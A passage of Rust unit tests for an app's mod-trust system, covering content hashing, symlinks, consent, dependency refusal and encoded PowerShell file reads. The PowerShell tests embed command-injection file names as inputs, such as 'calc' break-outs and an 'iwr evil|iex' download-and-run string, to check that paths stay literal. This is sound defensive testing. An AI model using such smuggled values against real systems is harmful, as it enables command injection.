        let snapshot = vec![json!({"key": "claude", "run": ["printf"]}), json!({"key": "claude-alt", "run": ["printf"]})];
        let next = std::thread::spawn(move || known_agents(None, snapshot)).join().unwrap();
        assert_eq!(next.as_array().unwrap().len(), 2);
        assert_eq!(next[0]["installed"], true);
        assert_eq!(next[1]["key"], "claude-alt");
        assert_eq!(next[1]["installed"], true);
    }

    #[test]
    fn shared_bursts_persist_only_complete_snapshots_and_finish_at_final_state() {
        let root = if cfg!(target_os = "linux") { PathBuf::from("/var/tmp") } else { std::env::temp_dir() };
        let dir = root.join(format!("h0x-shared-stress-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("shared.json");
        let reading = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(true));
        let reader = {
            let path = path.clone();
            let reading = reading.clone();
            std::thread::spawn(move || {
                while reading.load(std::sync::atomic::Ordering::Relaxed) {
                    match std::fs::read(&path) {
                        Ok(bytes) => { serde_json::from_slice::<Value>(&bytes).unwrap(); }
                        // Windows refuses to open a file while a rename replaces it. The reader
                        // got no bytes, so that is not a torn snapshot.
                        Err(e) if cfg!(windows) && e.kind() == std::io::ErrorKind::PermissionDenied => {}
                        Err(e) => assert_eq!(e.kind(), std::io::ErrorKind::NotFound),
                    }
                    std::thread::yield_now();
                }
            })
        };
        let expected = std::thread::spawn(move || {
            SHARED.with_borrow_mut(|s| *s = Some(SharedStore::load(path)));
            for i in 0..2000 {
                set_shared("changing".into(), json!("x".repeat(if i % 2 == 0 { 16000 } else { 3 })));
                set_shared("revision".into(), json!(i));
            }
            set_shared("final".into(), json!(true));
            finish_shared();
            with_shared(|s| s.values.clone())
        }).join().unwrap();
        reading.store(false, std::sync::atomic::Ordering::Relaxed);
        reader.join().unwrap();
        let actual: serde_json::Map<String, Value> = serde_json::from_slice(&std::fs::read(dir.join("shared.json")).unwrap()).unwrap();
        assert_eq!(actual, expected);
        assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 1);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn corrupt_shared_file_is_kept_before_starting_empty() {
        let root = if cfg!(target_os = "linux") { PathBuf::from("/var/tmp") } else { std::env::temp_dir() };
        let dir = root.join(format!("h0x-shared-corrupt-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("shared.json");
        let corrupt = b"{\"kept\":true} old snapshot tail";
        std::fs::write(&path, corrupt).unwrap();
        let store = SharedStore::load(path.clone());
        assert!(store.values.is_empty());
        assert!(store.writable);
        assert!(!path.exists());
        let backup = std::fs::read_dir(&dir).unwrap().next().unwrap().unwrap().path();
        assert!(backup.file_name().unwrap().to_string_lossy().starts_with("shared.json.corrupt-"));
        assert_eq!(std::fs::read(&backup).unwrap(), corrupt);
        crate::persist::write_atomic(&path, "{}").unwrap();
        assert_eq!(std::fs::read(backup).unwrap(), corrupt);
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn navigation_follows_mod_order() {
        let available = || vec!["t1".into(), "t2".into(), "t3".into()];
        AGENT_ORDER.with(|s| s.borrow_mut().clear());
        assert_eq!(agent_order(available()), available());
        AGENT_ORDER.with(|s| *s.borrow_mut() = vec!["t3".into(), "gone".into(), "t1".into(), "t3".into()]);
        assert_eq!(agent_order(available()), vec!["t3", "t1", "t2"]);
        assert!(agent_order(Vec::new()).is_empty());
        AGENT_ORDER.with(|s| *s.borrow_mut() = vec!["t2".into(), "t1".into(), "t3".into()]);
        assert_eq!(agent_order(available()), vec!["t2", "t1", "t3"]);
        AGENT_ORDER.with(|s| s.borrow_mut().clear());
    }

    #[test]
    fn an_added_file_makes_a_shipped_mod_edited() {
        let dir = std::env::temp_dir().join(format!("h0x-ade-shipped-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("icons")).unwrap();
        std::fs::write(dir.join("main.js"), "a").unwrap();
        std::fs::write(dir.join("icons/x.svg"), "b").unwrap();
        let files: Files = [("main.js".to_owned(), fingerprint(b"a")), ("icons/x.svg".to_owned(), fingerprint(b"b"))].into();
        assert!(as_shipped(&dir, &files));
        std::fs::write(dir.join("gpui-kit.d.ts"), "generated").unwrap();
        std::fs::write(dir.join("jsconfig.json"), "generated").unwrap();
        assert!(as_shipped(&dir, &files));
        std::fs::write(dir.join(".DS_Store"), "finder").unwrap();
        std::fs::create_dir(dir.join(".vscode")).unwrap();
        std::fs::write(dir.join(".vscode/settings.json"), "{}").unwrap();
        assert!(as_shipped(&dir, &files));
        std::fs::write(dir.join("mine.js"), "c").unwrap();
        assert!(!as_shipped(&dir, &files));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// Built-in (ADR-048) is the shipped bytes, not the name or the folder.
    #[test]
    fn only_byte_identical_shipped_mods_are_built_in() {
        let root = std::env::temp_dir().join(format!("h0x-ade-builtin-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let shipped: &[(&str, &[u8])] = &[("tool/main.js", b"export default 1;\n"), ("tool/icons/x.svg", b"<svg/>"), ("other/main.js", b"x")];
        let dir = root.join("tool");
        std::fs::create_dir_all(dir.join("icons")).unwrap();
        std::fs::write(dir.join("main.js"), b"export default 1;\n").unwrap();
        std::fs::write(dir.join("icons/x.svg"), b"<svg/>").unwrap();
        assert!(is_shipped(&dir, shipped));
        // The editor helpers gpui-shell writes on load don't count.
        std::fs::write(dir.join("gpui-kit.d.ts"), "generated").unwrap();
        std::fs::write(dir.join("jsconfig.json"), "generated").unwrap();
        assert!(is_shipped(&dir, shipped));
        // One byte changed: not built-in.
        std::fs::write(dir.join("main.js"), b"export default 2;\n").unwrap();
        assert!(!is_shipped(&dir, shipped));
        std::fs::write(dir.join("main.js"), b"export default 1;\n").unwrap();
        // A file missing or added: not built-in.
        std::fs::remove_file(dir.join("icons/x.svg")).unwrap();
        assert!(!is_shipped(&dir, shipped));
        std::fs::write(dir.join("icons/x.svg"), b"<svg/>").unwrap();
        std::fs::write(dir.join("extra.js"), b"").unwrap();
        assert!(!is_shipped(&dir, shipped));
        std::fs::remove_file(dir.join("extra.js")).unwrap();
        assert!(is_shipped(&dir, shipped));
        // Same code under a name HyperOx doesn't ship, or nothing shipped at all.
        let copy = root.join("tool-copy");
        std::fs::create_dir_all(copy.join("icons")).unwrap();
        std::fs::write(copy.join("main.js"), b"export default 1;\n").unwrap();
        std::fs::write(copy.join("icons/x.svg"), b"<svg/>").unwrap();
        assert!(!is_shipped(&copy, shipped));
        assert!(!is_shipped(&dir, &[]));
        // An empty folder of a shipped name.
        std::fs::create_dir_all(root.join("other")).unwrap();
        assert!(!is_shipped(&root.join("other"), shipped));
        std::fs::remove_dir_all(&root).unwrap();
        // Every shipped mod, written out as shipped, is built-in.
        let staged = std::env::temp_dir().join(format!("h0x-ade-builtin-all-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&staged);
        for (folder, files) in [("mods", DEFAULT_MODS), ("frame", FRAME_MODS)] {
            for (path, bytes) in files {
                let file = staged.join(folder).join(path);
                std::fs::create_dir_all(file.parent().unwrap()).unwrap();
                std::fs::write(file, bytes).unwrap();
            }
            for name in files.iter().filter_map(|(p, _)| p.split('/').next()).collect::<std::collections::BTreeSet<_>>() {
                assert!(is_shipped(&staged.join(folder).join(name), files), "{folder}/{name}");
            }
        }
        std::fs::remove_dir_all(&staged).unwrap();
    }

    #[test]
    fn an_edit_that_keeps_size_and_modified_time_still_asks_again() {
        // Shared mod code is keyed by content, like the consent: a same-size edit with the old
        // modified time (what a tool that restores times does) must not pass as the consented file.
        let root = std::env::temp_dir().join(format!("h0x-ade-samesize-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("main.js"), "export default 1;").unwrap();
        let before = std::fs::metadata(root.join("main.js")).unwrap().modified().unwrap();
        let found = Found { id: "x".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        let hash = content_hash(&root);
        let allowed: BTreeMap<String, crate::settings::ModChoice> = [("x".to_owned(), crate::settings::ModChoice { hash: hash.clone(), allow: true })].into();
        assert_eq!(trust(&found, &allowed), Trust::Allowed);
        std::fs::write(root.join("main.js"), "export default 2;").unwrap();
        let file = std::fs::File::options().write(true).open(root.join("main.js")).unwrap();
        file.set_modified(before).unwrap();
        drop(file);
        assert_eq!(std::fs::metadata(root.join("main.js")).unwrap().modified().unwrap(), before);
        assert_eq!(trust(&found, &allowed), Trust::Ask(content_hash(&root)));
        assert_ne!(content_hash(&root), hash);
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn the_hash_covers_files_at_any_depth_and_through_links_and_refuses_a_helper_entry() {
        let root = std::env::temp_dir().join(format!("h0x-ade-deep-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let mut deep = root.clone();
        for i in 0..17 {
            deep.push(format!("d{i}"));
        }
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        std::fs::write(deep.join("x.js"), "1").unwrap();
        let hash = content_hash(&root);
        std::fs::write(deep.join("x.js"), "2").unwrap();
        assert_ne!(content_hash(&root), hash, "a 17-level-deep file is hashed");
        std::fs::remove_dir_all(&root).unwrap();

        // A manifest whose entry is an editor helper (any spelling) is refused.
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        let found = Found { id: "x".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        let allowed = |h: String| -> BTreeMap<String, crate::settings::ModChoice> { [("x".to_owned(), crate::settings::ModChoice { hash: h, allow: true })].into() };
        for entry in ["jsconfig.json", "./jsconfig.json", "lib/../JSConfig.json", "sub\\..\\gpui-kit.d.ts"] {
            std::fs::write(root.join("gpui-shell.json"), format!(r#"{{"id":"x","name":"x","entry":{}}}"#, serde_json::to_string(entry).unwrap())).unwrap();
            assert!(entry_is_helper(&root), "{entry}");
            assert_eq!(trust(&found, &allowed(content_hash(&root))), Trust::Denied, "{entry}");
        }
        std::fs::write(root.join("gpui-shell.json"), r#"{"id":"x","name":"x","entry":"lib/jsconfig.json"}"#).unwrap();
        assert!(!entry_is_helper(&root));
        std::fs::write(root.join("gpui-shell.json"), r#"{"id":"x","name":"x","entry":"main.js"}"#).unwrap();
        assert_eq!(trust(&found, &allowed(content_hash(&root))), Trust::Allowed);

        // A file reachable only through a folder link (symlink or junction) is hashed too.
        let outside = std::env::temp_dir().join(format!("h0x-ade-outside-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&outside);
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("far.js"), "1").unwrap();
        let link = root.join("linked");
        #[cfg(unix)]
        let made = std::os::unix::fs::symlink(&outside, &link).is_ok();
        #[cfg(windows)]
        let made = std::process::Command::new("cmd").args(["/C", "mklink", "/J"]).arg(&link).arg(&outside).output().is_ok_and(|o| o.status.success());
        if made {
            let hash = content_hash(&root);
            assert!(mod_files(&root, true).contains(&"linked/far.js".to_owned()));
            std::fs::write(outside.join("far.js"), "2").unwrap();
            assert_ne!(content_hash(&root), hash);
            // A link back up is a loop: it ends, and the hash still comes out.
            #[cfg(unix)]
            std::os::unix::fs::symlink(&root, outside.join("up")).unwrap();
            assert_eq!(content_hash(&root).len(), 64);
        }
        let _ = std::fs::remove_dir_all(&outside);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// A folder link at `link` to `target`: a symlink, or a junction on Windows (no privilege needed).
    fn link_folder(target: &Path, link: &Path) {
        #[cfg(unix)]
        std::os::unix::fs::symlink(target, link).unwrap();
        #[cfg(windows)]
        assert!(std::process::Command::new("cmd").args(["/C", "mklink", "/J"]).arg(link).arg(target).output().unwrap().status.success(), "junction {}", link.display());
    }

    #[test]
    fn a_helper_entry_is_refused_however_it_is_spelled_and_nothing_else_is() {
        let root = std::env::temp_dir().join(format!("h0x-ade-entry-spellings-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("lib")).unwrap();
        std::fs::write(root.join("main.js"), "export default 1;\n").unwrap();
        let manifest = |entry: Value| std::fs::write(root.join("gpui-shell.json"), json!({"id": "x", "name": "x", "entry": entry}).to_string()).unwrap();
        for entry in ["jsconfig.json/", ".//jsconfig.json", "./sub/.././jsconfig.json", "a/b/../../GPUI-KIT.D.TS", "a\\b\\..\\..\\Gpui-Kit.d.ts", "../jsconfig.json"] {
            manifest(json!(entry));
            assert!(entry_is_helper(&root), "{entry:?}");
        }
        // Not a helper: empty, the root itself, a folder, other names, nested helpers (they are hashed),
        // and percent escapes (no one decodes them).
        for entry in ["", ".", "./", "lib", "main.js", "jsconfig", "jsconfig.json.js", "gpui-kit.d.ts.bak", "lib/gpui-kit.d.ts", "lib\\jsconfig.json", "%2e%2e/jsconfig.json", "jsconfig%2ejson"] {
            manifest(json!(entry));
            assert!(!entry_is_helper(&root), "{entry:?}");
        }
        // An entry that is not a string, a missing entry, a broken manifest, or no manifest: nothing to refuse here.
        for entry in [json!(null), json!(42), json!(["jsconfig.json"]), json!({"path": "jsconfig.json"})] {
            manifest(entry.clone());
            assert!(!entry_is_helper(&root), "{entry}");
        }
        std::fs::write(root.join("gpui-shell.json"), r#"{"id":"x","name":"x"}"#).unwrap();
        assert!(!entry_is_helper(&root));
        std::fs::write(root.join("gpui-shell.json"), r#"{"id":"x","entry":"jsconfig.json""#).unwrap();
        assert!(!entry_is_helper(&root));
        std::fs::write(root.join("gpui-shell.json"), "").unwrap();
        assert!(!entry_is_helper(&root));
        std::fs::remove_file(root.join("gpui-shell.json")).unwrap();
        assert!(!entry_is_helper(&root));
        // An empty entry is not refused: it is asked about like any other code.
        manifest(json!(""));
        let found = Found { id: "x".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        assert_eq!(trust(&found, &BTreeMap::new()), Trust::Ask(content_hash(&root)));
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn a_helper_file_the_mods_code_imports_is_covered_by_the_answer() {
        // The module resolver loads any file in the mod as a module, the root editor helpers included,
        // and gpui-shell keeps a jsconfig.json that is already there.
        let root = std::env::temp_dir().join(format!("h0x-ade-helper-import-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("gpui-shell.json"), r#"{"id":"x","name":"x","entry":"main.js"}"#).unwrap();
        std::fs::write(root.join("main.js"), "import \"./jsconfig.json\";\nexport default 1;\n").unwrap();
        std::fs::write(root.join("jsconfig.json"), "globalThis.answer = 1;\n").unwrap();
        let found = Found { id: "x".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        let hash = content_hash(&root);
        let choices: BTreeMap<String, crate::settings::ModChoice> = [("x".to_owned(), crate::settings::ModChoice { hash, allow: true })].into();
        assert_eq!(trust(&found, &choices), Trust::Allowed);
        std::fs::write(root.join("jsconfig.json"), "globalThis.answer = 2;\n").unwrap();
        assert_ne!(trust(&found, &choices), Trust::Allowed, "imported code changed after the answer");
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn a_folder_link_to_the_mod_itself_ends_with_each_file_listed_once() {
        let root = std::env::temp_dir().join(format!("h0x-ade-self-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("sub")).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        std::fs::write(root.join("sub/a.js"), "b").unwrap();
        link_folder(&root, &root.join("self"));
        link_folder(&root, &root.join("sub").join("back"));
        assert_eq!(mod_files(&root, true), ["main.js", "sub/a.js"]);
        assert_eq!(content_hash(&root).len(), 64);
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn a_folder_link_to_a_parent_hashes_the_files_outside_the_mod_but_not_the_mod_twice() {
        let parent = std::env::temp_dir().join(format!("h0x-ade-parent-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&parent);
        let root = parent.join("mod");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(parent.join("other")).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        std::fs::write(parent.join("other/f.js"), "1").unwrap();
        link_folder(&parent, &root.join("up"));
        assert_eq!(mod_files(&root, true), ["main.js", "up/other/f.js"]);
        let hash = content_hash(&root);
        std::fs::write(parent.join("other/f.js"), "2").unwrap();
        assert_ne!(content_hash(&root), hash);
        std::fs::remove_dir_all(&parent).unwrap();
    }

    #[test]
    fn two_links_to_one_folder_list_it_once_and_two_mods_sharing_it_both_answer_for_it() {
        let base = std::env::temp_dir().join(format!("h0x-ade-shared-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let shared = base.join("shared");
        let (a, b) = (base.join("a"), base.join("b"));
        for dir in [&shared, &a, &b] {
            std::fs::create_dir_all(dir).unwrap();
        }
        std::fs::write(shared.join("f.js"), "1").unwrap();
        std::fs::write(a.join("main.js"), "a").unwrap();
        std::fs::write(b.join("main.js"), "b").unwrap();
        link_folder(&shared, &a.join("one"));
        link_folder(&shared, &a.join("two"));
        link_folder(&shared, &b.join("fonts"));
        let files = mod_files(&a, true);
        assert_eq!(files.len(), 2, "{files:?}");
        assert!(files.contains(&"one/f.js".to_owned()) != files.contains(&"two/f.js".to_owned()), "{files:?}");
        assert_eq!(mod_files(&b, true), ["fonts/f.js", "main.js"]);
        let (hash_a, hash_b) = (content_hash(&a), content_hash(&b));
        std::fs::write(shared.join("f.js"), "2").unwrap();
        assert_ne!(content_hash(&a), hash_a);
        assert_ne!(content_hash(&b), hash_b);
        std::fs::remove_dir_all(&base).unwrap();
    }

    #[test]
    fn a_dangling_folder_link_still_gives_a_hash() {
        let base = std::env::temp_dir().join(format!("h0x-ade-dangling-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let (root, gone) = (base.join("mod"), base.join("gone"));
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&gone).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        link_folder(&gone, &root.join("fonts"));
        std::fs::remove_dir_all(&gone).unwrap();
        assert!(mod_files(&root, true).contains(&"main.js".to_owned()));
        assert_eq!(content_hash(&root).len(), 64);
        std::fs::remove_dir_all(&base).unwrap();
    }

    #[test]
    fn thousands_of_files_and_deep_folders_are_all_hashed() {
        let root = std::env::temp_dir().join(format!("h0x-ade-many-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        for d in 0..40 {
            let dir = root.join(format!("d{d}"));
            std::fs::create_dir_all(&dir).unwrap();
            for f in 0..50 {
                std::fs::write(dir.join(format!("f{f}.js")), format!("{d}/{f}")).unwrap();
            }
        }
        let mut deep = root.clone();
        for _ in 0..48 {
            deep.push("n");
        }
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(deep.join("x.js"), "1").unwrap();
        let files = mod_files(&root, true);
        assert_eq!(files.len(), 40 * 50 + 1);
        assert!(files.contains(&format!("{}x.js", "n/".repeat(48))));
        let hash = content_hash(&root);
        std::fs::write(deep.join("x.js"), "2").unwrap();
        assert_ne!(content_hash(&root), hash, "the 48-deep file counts");
        std::fs::write(deep.join("x.js"), "1").unwrap();
        std::fs::write(root.join("d39/f49.js"), "changed").unwrap();
        assert_ne!(content_hash(&root), hash, "the last of 2000 files counts");
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn a_shipped_mod_with_a_linked_folder_of_files_is_not_built_in() {
        let base = std::env::temp_dir().join(format!("h0x-ade-builtin-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let shipped: &[(&str, &[u8])] = &[("tool/main.js", b"export default 1;\n")];
        let (dir, outside) = (base.join("tool"), base.join("outside"));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(dir.join("main.js"), b"export default 1;\n").unwrap();
        // A link to an empty folder adds nothing.
        link_folder(&outside, &dir.join("fonts"));
        assert!(is_shipped(&dir, shipped));
        std::fs::write(outside.join("extra.js"), b"x").unwrap();
        assert!(!is_shipped(&dir, shipped));
        std::fs::remove_dir_all(&base).unwrap();
    }

    #[test]
    fn a_mods_answer_holds_for_its_code_only() {
        let root = std::env::temp_dir().join(format!("h0x-ade-consent-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("lib")).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        std::fs::write(root.join("lib/.helper.js"), "b").unwrap();
        let hash = content_hash(&root);
        assert_eq!(hash.len(), 64);
        // gpui-shell's editor helpers don't change it; any byte, dot files included, does.
        std::fs::write(root.join("jsconfig.json"), "{}").unwrap();
        assert_eq!(content_hash(&root), hash);
        std::fs::write(root.join("lib/.helper.js"), "c").unwrap();
        assert_ne!(content_hash(&root), hash);
        std::fs::write(root.join("lib/.helper.js"), "b").unwrap();
        assert_eq!(content_hash(&root), hash);
        std::fs::write(root.join("main.js"), "b").unwrap();
        assert_ne!(content_hash(&root), hash);
        std::fs::remove_dir_all(&root).unwrap();
        // An empty or missing folder still has a hash (of nothing).
        assert_eq!(content_hash(&root), crate::update::sha256(b""));

        use crate::settings::ModChoice;
        let choices: BTreeMap<String, ModChoice> = [
            ("yes".to_owned(), ModChoice { hash: "h1".into(), allow: true }),
            ("no".to_owned(), ModChoice { hash: "h1".into(), allow: false }),
            ("blank".to_owned(), ModChoice::default()),
        ].into();
        assert_eq!(decide(&choices, "yes", "h1".into()), Trust::Allowed);
        assert_eq!(decide(&choices, "no", "h1".into()), Trust::Denied);
        // Changed code asks again, allowed or not before; so do unknown mods.
        assert_eq!(decide(&choices, "yes", "h2".into()), Trust::Ask("h2".into()));
        assert_eq!(decide(&choices, "no", "h2".into()), Trust::Ask("h2".into()));
        assert_eq!(decide(&choices, "new", "h1".into()), Trust::Ask("h1".into()));
        assert_eq!(decide(&BTreeMap::new(), "", String::new()), Trust::Ask(String::new()));
        // A hand-written entry without a hash never matches real code.
        assert_eq!(decide(&choices, "blank", "h1".into()), Trust::Ask("h1".into()));
        // settings.json round trip, and an entry missing fields still parses.
        let person: crate::settings::Person = serde_json::from_str(r#"{"mods":{"yes":{"hash":"h1","allow":true},"half":{"allow":true}}}"#).unwrap();
        assert_eq!(person.mods["yes"], ModChoice { hash: "h1".into(), allow: true });
        assert_eq!(decide(&person.mods, "half", "h1".into()), Trust::Ask("h1".into()));
    }

    #[test]
    fn a_mod_with_git_dependencies_never_runs_even_when_allowed() {
        let root = std::env::temp_dir().join(format!("h0x-ade-deps-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        let found = Found { id: "deps-test".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        let allowed = |hash: String| BTreeMap::from([("deps-test".to_owned(), crate::settings::ModChoice { hash, allow: true })]);
        for (manifest, refused) in [
            (None, false),
            (Some(r#"{"id":"x","name":"x","entry":"main.js"}"#), false),
            (Some(r#"{"dependencies":null}"#), false),
            (Some(r#"{"dependencies":{}}"#), false),
            (Some(r#"{"dependencies":{"lib":{"git":"https://example.com/l.git","branch":"main"}}}"#), true),
            (Some(r#"{"dependencies":{"lib":{"git":"https://example.com/l.git","tag":"v1"}}}"#), true),
            (Some(r#"{"dependencies":{"lib":"https://example.com/l.git#0123456789abcdef0123456789abcdef01234567"}}"#), true),
            (Some(r#"{"dependencies":["lib"]}"#), true),
        ] {
            let _ = std::fs::remove_file(root.join("gpui-shell.json"));
            if let Some(m) = manifest {
                std::fs::write(root.join("gpui-shell.json"), m).unwrap();
            }
            // The person allowed exactly this code: dependencies still decide.
            let verdict = trust(&found, &allowed(content_hash(&root)));
            assert_eq!(verdict, if refused { Trust::Denied } else { Trust::Allowed }, "{manifest:?}");
        }
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn network_paths_are_not_read_through_a_remote_machine() {
        for unc in ["\\\\server\\share\\f.txt", "//server/share/f.txt", "\\\\?\\UNC\\server\\share\\f.txt", "\\/server/share", "//"] {
            assert!(is_unc(unc), "{unc}");
        }
        for local in ["C:/r/f.txt", "C:\\r\\f.txt", "/home/u/f.txt", "r/f.txt", "", "/", "\\r"] {
            assert!(!is_unc(local), "{local}");
        }
    }

    #[test]
    fn a_remote_windows_read_passes_the_path_as_data_not_as_a_command_line() {
        use base64::Engine;
        let script = |path: &str| {
            let args = windows_read_args(path);
            assert_eq!(args[..3], ["-NoProfile", "-NonInteractive", "-EncodedCommand"]);
            // Only base64 reaches the command line: nothing for cmd.exe or Rust's quoting to act on.
            assert!(args[3].chars().all(|c| c.is_ascii_alphanumeric() || "+/=".contains(c)), "{path}");
            let bytes = base64::engine::general_purpose::STANDARD.decode(&args[3]).unwrap();
            String::from_utf16(&bytes.chunks(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect::<Vec<_>>()).unwrap()
        };
        assert!(script("C:/r/a&calc&.txt").contains("ReadAllBytes('C:\\r\\a&calc&.txt')"));
        for path in ["a|b^c%PATH%\"d(e).txt", "it's.txt", "x\u{2018};iwr evil|iex;\u{2019}.txt"] {
            let s = script(path);
            let want = crate::programs::powershell_quote(path);
            assert!(s.contains(&format!("ReadAllBytes({want})")), "{path}");
        }
        // Curly quotes are doubled like the straight one, so none ends the literal early.
        assert!(script("a\u{2019}b").contains("'a\u{2019}\u{2019}b'"));
        assert!(script("a'b").contains("'a''b'"));
    }

    #[test]
    fn a_remote_windows_read_reads_back_exactly_the_path_and_runs_nothing_else() {
        use base64::Engine;
        let quotes = ['\'', '\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'];
        let script = |path: &str| {
            let args = windows_read_args(path);
            assert_eq!(args.len(), 4, "{path:?}");
            assert_eq!(args[..3], ["-NoProfile", "-NonInteractive", "-EncodedCommand"]);
            assert!(!args[3].is_empty() && args[3].bytes().all(|b| b.is_ascii_alphanumeric() || b"+/=".contains(&b)), "{path:?}");
            let bytes = base64::engine::general_purpose::STANDARD.decode(&args[3]).unwrap();
            assert_eq!(bytes.len() % 2, 0, "{path:?}");
            (args[3].len(), String::from_utf16(&bytes.chunks(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect::<Vec<_>>()).unwrap())
        };
        // Splits a script into what precedes the path, the path as PowerShell reads its
        // single-quoted literal (any of the five quotes ends it unless doubled), and the rest.
        let split = |s: &str| {
            let at = s.find("ReadAllBytes(").unwrap() + "ReadAllBytes(".len();
            let mut chars = s[at..].char_indices().peekable();
            assert!(chars.next().is_some_and(|(_, c)| quotes.contains(&c)), "{s}");
            let mut literal = String::new();
            while let Some((i, c)) = chars.next() {
                if !quotes.contains(&c) {
                    literal.push(c);
                } else if chars.peek().is_some_and(|(_, n)| quotes.contains(n)) {
                    literal.push(chars.next().unwrap().1);
                } else {
                    return (s[..at].to_owned(), literal, s[at + i + c.len_utf8()..].to_owned());
                }
            }
            panic!("the literal never ends: {s}");
        };
        let (_, reference) = script("x");
        let (head, _, tail) = split(&reference);
        let long = format!("C:/{}/f.txt", "d\u{e9}&|'\u{2019} ".repeat(1500));
        let max_path = format!("C:\\{}", "a".repeat(4093));
        for path in [
            "",
            "-",
            "--",
            "-EncodedCommand ZQBjAGgAbwA=",
            "a b c.txt",
            r"C:\Users\me\it's here.txt",
            "C:/mixed\\slashes/x.txt",
            "//server/share/a.txt",
            r"\\server\share\a.txt",
            r"\\?\C:\a.txt",
            "a&b|c^d%PATH%\"e(f)g<h>i.txt",
            "x'); calc; ('",
            "x\u{2018}); calc; (\u{2019}",
            "\u{201A}); calc; #\u{201B}",
            "'",
            "''",
            "\u{2019}\u{2019}\u{2019}",
            "line\nbreak'; calc\r\n#",
            "nul\0byte",
            "$(calc)`$env:x`.txt",
            "@'\n'@",
            "\u{65e5}\u{672c}\u{8a9e}/\u{1f600}.txt",
            max_path.as_str(),
            long.as_str(),
        ] {
            let (encoded, s) = script(path);
            let (h, literal, t) = split(&s);
            // The same script around it every time; the path comes back unchanged (slashes turned).
            assert_eq!((h.as_str(), t.as_str()), (head.as_str(), tail.as_str()), "{path:?}");
            assert_eq!(literal, path.replace('/', "\\"), "{path:?}");
            if path.len() <= 4096 {
                // Still fits a Windows command line (32767 characters).
                assert!(encoded < 32_000, "{path:?}: {encoded}");
            }
        }
    }

    #[test]
    fn a_mods_dependencies_block_it_in_any_shape_unless_absent_or_empty() {
        let root = std::env::temp_dir().join(format!("h0x-ade-deps-shapes-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("main.js"), "a").unwrap();
        let found = Found { id: "deps-shapes".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
        let manifest = |deps: Option<&str>| match deps {
            Some(d) => format!(r#"{{"id":"deps-shapes","name":"x","entry":"main.js","dependencies":{d}}}"#),
            None => r#"{"id":"deps-shapes","name":"x","entry":"main.js"}"#.to_owned(),
        };
        let huge = format!("\"{}\"", "g".repeat(1 << 20));
        let many = format!("{{{}}}", (0..500).map(|i| format!("\"l{i}\":\"https://example.com/l{i}.git#main\"")).collect::<Vec<_>>().join(","));
        let blocked = [
            r#"{"lib":{"git":"https://example.com/l.git"}}"#,
            r#"{"lib":{"git":"https://example.com/l.git","entry":"src/x.js"}}"#,
            r#"{"lib":"https://example.com/l.git#main"}"#,
            r#"{"":""}"#,
            r#"{"lib":null}"#,
            r#"{"lib":{}}"#,
            "0",
            "1.5e300",
            "-1",
            "true",
            "false",
            r#""https://example.com/l.git""#,
            "[[[\"lib\"]]]",
            "[{\"git\":\"https://example.com/l.git\"}]",
            huge.as_str(),
            many.as_str(),
        ];
